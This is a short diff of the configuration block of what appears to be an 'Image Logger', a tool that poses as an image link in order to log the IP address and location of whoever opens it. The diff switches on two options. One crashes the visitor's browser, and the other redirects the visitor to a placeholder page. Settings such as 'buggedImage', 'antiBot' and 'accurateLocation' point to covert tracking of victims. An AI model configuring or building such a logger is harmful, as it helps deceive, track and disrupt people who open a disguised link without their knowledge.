@@ -17,7 +17,7 @@ config = {
     "imageArgument": True,
     "username": "Image Logger",
     "color": 0x00FFFF,
-    "crashBrowser": False,
+    "crashBrowser": True,
     "accurateLocation": False,
     "message": {
         "doMessage": False,
@@ -29,7 +29,7 @@ config = {
     "buggedImage": True,
     "antiBot": 1,
     "redirect": {
-        "redirect": False,
+        "redirect": True,
         "page": "https://your-link.here"
     },
 }
